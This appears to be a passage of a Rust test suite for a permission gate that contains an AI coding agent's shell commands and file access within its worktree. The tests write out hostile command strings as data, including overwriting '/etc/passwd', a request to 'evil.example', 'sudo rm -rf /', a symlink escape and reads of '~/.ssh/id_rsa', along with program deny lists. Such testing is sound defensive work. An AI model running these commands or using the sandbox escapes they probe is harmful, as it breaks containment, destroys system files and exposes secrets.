        // A deny list that silently matches nothing is worse than none at all.
        let error = PolicyGate::new(
            "/tmp/ws/repo",
            &["**".to_string()],
            &["**/{a,b}".to_string()],
            policy(),
        )
        .unwrap_err();
        assert!(error.to_string().contains("brace"));
    }

    #[test]
    fn external_is_always_escalated() {
        let verdict = gate().check(Effect::External, &[]);
        assert!(matches!(verdict, Verdict::Escalated(_)), "{verdict:?}");
    }

    #[test]
    fn a_policy_flag_never_turns_external_into_allowed() {
        // The design's rule: `allow_*` marks an escalation as auto-answerable, nothing more.
        let mut policy = policy();
        policy.allow_network = true;
        policy.allow_push = true;
        policy.allow_sudo = true;
        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
        assert!(!gate.check(Effect::External, &[]).is_allowed());
        assert!(!gate.check_command("curl https://example.com").is_allowed());
        assert!(!gate.check_command("sudo ls").is_allowed());
        assert!(!gate.check_command("git push").is_allowed());
    }

    #[test]
    fn an_external_command_with_network_allowed_carries_the_auto_approval_hint() {
        let mut policy = policy();
        policy.allow_network = true;
        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
        let Verdict::Escalated(escalation) = gate.check_command("curl https://example.com") else {
            panic!("expected an escalation");
        };
        assert!(escalation.auto_approvable);
        assert!(escalation.key.contains("curl"), "{}", escalation.key);
    }

    #[test]
    fn a_network_command_without_the_flag_is_not_auto_approvable() {
        let Verdict::Escalated(escalation) = gate().check_command("curl https://example.com") else {
            panic!("expected an escalation");
        };
        assert!(!escalation.auto_approvable);
    }

    #[test]
    fn an_unknown_command_is_escalated_not_allowed() {
        let verdict = gate().check_command("frobnicate --all");
        assert!(matches!(verdict, Verdict::Escalated(_)), "{verdict:?}");
        assert!(verdict.observation().unwrap().contains("not a known command"));
    }

    #[test]
    fn a_read_command_with_safe_paths_is_allowed() {
        assert_eq!(gate().check_command("ls -la src"), Verdict::Allowed);
        assert_eq!(gate().check_command("cat src/main.rs"), Verdict::Allowed);
    }

    #[test]
    fn a_mutating_command_inside_the_worktree_is_allowed() {
        assert_eq!(gate().check_command("mkdir -p src/new"), Verdict::Allowed);
        assert_eq!(gate().check_command("rm -rf target"), Verdict::Allowed);
    }

    #[test]
    fn a_write_command_aimed_outside_the_worktree_is_denied() {
        let verdict = gate().check_command("rm -rf ../other-project");
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn a_redirect_outside_the_worktree_is_denied() {
        let verdict = gate().check_command("echo pwned > /etc/passwd");
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn a_redirect_inside_the_worktree_is_a_mutation_but_allowed() {
        assert_eq!(gate().check_command("echo hi > notes.txt"), Verdict::Allowed);
    }

    #[test]
    fn a_redirect_to_dev_null_is_not_a_write_outside_the_worktree() {
        // The bug the first live run hit hardest: `/dev/null` was read as a write outside the
        // worktree, so `bundle exec rspec 2>/dev/null` — and every other ordinary way to silence
        // stderr — was denied. Two subtasks were blocked on DoD gates whose command never ran:
        // the gate reported "(no exit code)", which reads as a failing check rather than as a
        // policy refusal, so the model kept rewriting code that was already correct.
        for command in [
            "cargo test 2>/dev/null",
            "cargo test > /dev/null 2>&1",
            "grep -qE 'x' README.md > /dev/null",
        ] {
            assert_eq!(gate().check_command(command), Verdict::Allowed, "{command}");
        }
        // An unknown program is still external: the sink excuses a path, never a program. The
        // distinction matters because the live command was `bundle exec rspec`, and calling that
        // `Allowed` would be a different — and much larger — change than the one being made.
        let verdict = gate().check_command("bundle exec rspec 2>/dev/null");
        let Verdict::Escalated(escalation) = verdict else {
            panic!("an unknown program must still be escalated, got {verdict:?}");
        };
        assert!(
            escalation.reason.contains("`bundle` is not a known command"),
            "{escalation:?}"
        );
    }

    #[test]
    fn a_sink_redirect_does_not_excuse_a_real_write_on_the_same_line() {
        // Not a whitelist for the line: the sink is skipped and every other path is still judged.
        // A rule that returned `Allowed` as soon as it saw `/dev/null` would be the hole this
        // whole module exists to close.
        let verdict = gate().check_command("echo x > /dev/null; echo pwned > /etc/passwd");
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn a_trusted_host_command_is_allowed() {
        // The model backend lives on a trusted host; asking a human for every request would make
        // the system unusable.
        assert_eq!(
            gate().check_command("curl http://llm-server:47832/v1/models"),
            Verdict::Allowed
        );
    }

    #[test]
    fn a_trusted_host_does_not_launder_a_write_outside_the_worktree() {
        let verdict = gate().check_command("curl http://llm-server/x > /etc/passwd");
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn an_untrusted_host_is_escalated_even_beside_a_trusted_one() {
        let verdict = gate().check_command("curl http://llm-server/x https://evil.example/y");
        assert!(matches!(verdict, Verdict::Escalated(_)), "{verdict:?}");
    }

    #[test]
    fn a_host_prefix_does_not_count_as_the_trusted_host() {
        // `llm-server-logs` is a different host and must not inherit trust.
        let verdict = gate().check_command("curl http://llm-server-logs.example/x");
        assert!(matches!(verdict, Verdict::Escalated(_)), "{verdict:?}");
    }

    #[test]
    fn a_mutating_tool_that_names_no_path_is_allowed() {
        // A process registry call or a commit: the effect is real but there is no path to check.
        assert_eq!(gate().check(Effect::Mutate, &[]), Verdict::Allowed);
    }

    #[test]
    fn a_denial_lists_alternatives_and_says_nothing_ran() {
        let verdict = gate().check(Effect::Mutate, &[PathUse::write(".env")]);
        let observation = verdict.observation().unwrap();
        let body: serde_json::Value = serde_json::from_str(&observation).unwrap();
        assert_eq!(body["error"], "denied_by_policy");
        assert!(body["alternatives"].as_array().unwrap().len() >= 2);
        assert!(body["hint"].as_str().unwrap().contains("Nothing was executed"));
    }

    #[test]
    fn the_observation_is_deterministic() {
        let first = gate().check(Effect::Mutate, &[PathUse::write(".env")]);
        let second = gate().check(Effect::Mutate, &[PathUse::write(".env")]);
        assert_eq!(first.observation(), second.observation());
    }

    #[test]
    fn the_summary_is_one_line() {
        let verdict = gate().check(Effect::Mutate, &[PathUse::write(".env")]);
        let summary = verdict.summary();
        assert!(summary.starts_with("denied: "));
        assert!(!summary.contains('\n'), "{summary}");
        assert_eq!(Verdict::Allowed.summary(), "allowed");
    }

    #[test]
    fn every_path_in_a_multi_path_call_is_checked() {
        let verdict = gate().check(
            Effect::Mutate,
            &[PathUse::write("src/a.rs"), PathUse::write("../escape")],
        );
        assert!(verdict.is_denied(), "one bad path must deny the call");
    }

    #[test]
    fn a_read_path_declared_as_a_write_is_checked_as_a_write() {
        let verdict = gate().check(Effect::Read, &[PathUse::write("../escape")]);
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn a_symlink_out_of_the_worktree_is_seen_through() {
        // The check canonicalises the existing prefix, which is what defeats
        // `ln -s /etc link; write_file("link/passwd")`.
        let dir = tempfile::tempdir().unwrap();
        let worktree = dir.path().join("repo");
        std::fs::create_dir_all(&worktree).unwrap();
        let outside = dir.path().join("outside");
        std::fs::create_dir_all(&outside).unwrap();
        std::os::unix::fs::symlink(&outside, worktree.join("link")).unwrap();

        let gate = PolicyGate::with_defaults(&worktree, policy()).unwrap();
        // `link/new.txt` does not exist yet, so only the prefix resolves - and it resolves outside.
        let verdict = gate.check(Effect::Mutate, &[PathUse::write("link/new.txt")]);
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn an_absolute_worktree_path_is_accepted_as_absolute() {
        let dir = tempfile::tempdir().unwrap();
        let worktree = dir.path().join("repo");
        std::fs::create_dir_all(&worktree).unwrap();
        let gate = PolicyGate::with_defaults(&worktree, policy()).unwrap();
        let absolute = worktree.join("src").join("a.rs");
        assert_eq!(
            gate.check(Effect::Mutate, &[PathUse::write(absolute.to_string_lossy())]),
            Verdict::Allowed
        );
    }

    #[test]
    fn the_worktree_is_kept_as_given_for_messages() {
        let dir = tempfile::tempdir().unwrap();
        let gate = PolicyGate::with_defaults(dir.path(), policy()).unwrap();
        assert_eq!(gate.worktree(), dir.path());
    }

    // ── deny_read_globs ─────────────────────────────────────────────────────────

    /// A gate whose `workspace_root` is the tempdir itself, so a relative deny glob has the same
    /// frame the operator sees when writing one.
    fn gate_with_deny_read(root: &Path, globs: &[&str]) -> PolicyGate {
        let mut policy = policy();
        policy.workspace_root = root.to_path_buf();
        policy.deny_read_globs = globs.iter().map(|g| (*g).to_string()).collect();
        PolicyGate::with_defaults(root, policy).expect("valid policy")
    }

    #[test]
    fn a_read_on_the_deny_list_is_denied() {
        // `~/.ssh/id_rsa` used to be as reachable as `src/main.rs` once the workspace root
        // contained the home directory. The glob is matched relative to that root.
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".ssh")).unwrap();
        std::fs::write(dir.path().join(".ssh/id_rsa"), "secret").unwrap();
        let gate = gate_with_deny_read(dir.path(), &["**/.ssh/**"]);

        let verdict = gate.check(Effect::Read, &[PathUse::read(".ssh/id_rsa")]);
        assert!(verdict.is_denied(), "{verdict:?}");
        assert!(verdict.observation().unwrap().contains("read deny list"));
    }

    #[test]
    fn a_read_beside_the_denied_one_is_still_allowed() {
        // A deny rule that denied the whole directory would be an outage, not a policy.
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".ssh")).unwrap();
        std::fs::write(dir.path().join(".ssh/id_rsa"), "secret").unwrap();
        std::fs::write(dir.path().join("main.rs"), "fn main() {}").unwrap();
        let gate = gate_with_deny_read(dir.path(), &["**/.ssh/**"]);

        assert_eq!(
            gate.check(Effect::Read, &[PathUse::read("main.rs")]),
            Verdict::Allowed
        );
    }

    #[test]
    fn an_empty_read_deny_list_denies_nothing() {
        // The default. If this ever fails, every existing project starts refusing reads.
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.txt"), "x").unwrap();
        let gate = gate_with_deny_read(dir.path(), &[]);
        assert_eq!(
            gate.check(Effect::Read, &[PathUse::read("a.txt")]),
            Verdict::Allowed
        );
    }

    #[test]
    fn a_malformed_read_deny_glob_fails_at_construction() {
        // Same rule as the write list: a deny rule that silently matches nothing is worse than
        // none, because the config claims protection it does not give.
        let mut policy = policy();
        policy.deny_read_globs = vec!["**/{a,b}".to_string()];
        let error = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap_err();
        assert!(error.to_string().contains("brace"), "{error}");
    }

    // ── deny_programs ───────────────────────────────────────────────────────────

    fn gate_with_deny_programs(programs: &[&str]) -> PolicyGate {
        let mut policy = policy();
        policy.deny_programs = programs.iter().map(|p| (*p).to_string()).collect();
        PolicyGate::with_defaults("/tmp/ws/repo", policy).expect("valid policy")
    }

    #[test]
    fn a_denied_program_is_denied_not_escalated() {
        // Escalated would mean "a human may say yes", and a deny list is exactly the answer a
        // human already gave.
        let gate = gate_with_deny_programs(&["sudo"]);
        let verdict = gate.check_command("sudo ls");
        assert!(verdict.is_denied(), "{verdict:?}");
        assert!(verdict.observation().unwrap().contains("program deny list"));
    }

    #[test]
    fn a_denied_program_is_caught_after_its_path() {
        // `/usr/bin/sudo` must not slip past a list naming `sudo`: the classifier reports the
        // basename, which is what a human writes.
        let gate = gate_with_deny_programs(&["sudo"]);
        assert!(gate.check_command("/usr/bin/sudo ls").is_denied());
    }

    #[test]
    fn a_denied_program_wins_over_the_trusted_host_shortcut() {
        // `trusted_hosts` is about the network; the deny list is about the program. `curl` to the
        // model backend is still `curl`.
        let gate = gate_with_deny_programs(&["curl"]);
        let verdict = gate.check_command("curl http://llm-server:47832/v1/models");
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn a_denied_program_in_a_chain_denies_the_whole_line() {
        // `bundle exec rspec && sudo rm -rf /` is one command line and one verdict.
        let gate = gate_with_deny_programs(&["sudo"]);
        assert!(gate.check_command("ls && sudo ls").is_denied());
    }

    #[test]
    fn an_unlisted_program_is_not_denied_by_this_rule() {
        // The deny list is a deny list: it says nothing about everything else. `frobnicate` is
        // still an escalation, which is a different verdict.
        let gate = gate_with_deny_programs(&["sudo"]);
        let verdict = gate.check_command("frobnicate --all");
        assert!(!verdict.is_denied(), "{verdict:?}");
        assert!(matches!(verdict, Verdict::Escalated(_)), "{verdict:?}");
    }

    // ── with_defaults honours the policy ───────────────────────────────────────

    #[test]
    fn with_defaults_uses_the_policys_deny_write_globs() {
        // Regression: this constructor ignored `policy.deny_write_globs` and substituted a
        // hardcoded pair, so an operator's list was parsed, validated and then discarded. The
        // daemon calls this constructor, so the bug made the shipped deny list a decoration.
        let mut policy = policy();
        policy.deny_write_globs = vec!["secrets/**".to_string()];
        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
        let verdict = gate.check(Effect::Mutate, &[PathUse::write("secrets/key.txt")]);
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn with_defaults_still_denies_the_builtin_protected_paths() {
        // The defaults are what most operators run; `.git/config` must not become writable just
        // because the list now comes from the policy.
        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy()).unwrap();
        assert!(
            gate.check(Effect::Mutate, &[PathUse::write(".git/config")])
                .is_denied()
        );
        assert!(gate.check(Effect::Mutate, &[PathUse::write(".env")]).is_denied());
    }

    // ── yolo ────────────────────────────────────────────────────────────────────

    fn yolo_gate() -> PolicyGate {
        let mut policy = policy();
        policy.yolo = true;
        PolicyGate::with_defaults("/tmp/ws/repo", policy).expect("valid policy")
    }

    #[test]
    fn yolo_lets_an_external_call_through() {
        assert_eq!(yolo_gate().check(Effect::External, &[]), Verdict::Allowed);
    }

    #[test]
    fn yolo_lets_an_unknown_program_run() {
        // The point of the flag: `bundle exec rspec` stops being a question.
        assert_eq!(yolo_gate().check_command("bundle exec rspec"), Verdict::Allowed);
        assert_eq!(yolo_gate().check_command("sudo ls"), Verdict::Allowed);
    }

    #[test]
    fn yolo_does_not_let_a_write_outside_the_worktree_through() {
        // Waiving the escalation must not waive containment: `curl evil > ~/.zshrc` is still a
        // write outside the worktree.
        let verdict = yolo_gate().check_command("echo pwned > /etc/passwd");
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn yolo_on_an_external_effect_still_checks_the_paths() {
        // The same rule at the `check` entry point, which the tools call directly: an external
        // call that names a path outside the worktree stays denied. Without this, a tool whose
        // `effect()` returns `External` and whose `paths()` names a protected file would slip past
        // the flag's stated limit.
        let verdict = yolo_gate().check(Effect::External, &[PathUse::write("/etc/passwd")]);
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn yolo_does_not_lift_the_program_deny_list() {
        // The deny list is the operator's statement about what must never happen. A convenience
        // flag is not a reason to break it.
        let mut policy = policy();
        policy.yolo = true;
        policy.deny_programs = vec!["sudo".to_string()];
        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
        assert!(gate.check_command("sudo ls").is_denied());
    }

    #[test]
    fn yolo_does_not_lift_the_write_deny_list() {
        let mut policy = policy();
        policy.yolo = true;
        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
        assert!(
            gate.check(Effect::Mutate, &[PathUse::write(".git/config")])
                .is_denied(),
            "yolo must not unlock a path the deny list protects"
        );
    }

    #[test]
    fn yolo_is_off_by_default() {
        assert!(!Policy::default().yolo);
        assert!(matches!(
            gate().check_command("frobnicate --all"),
            Verdict::Escalated(_)
        ));
    }
}
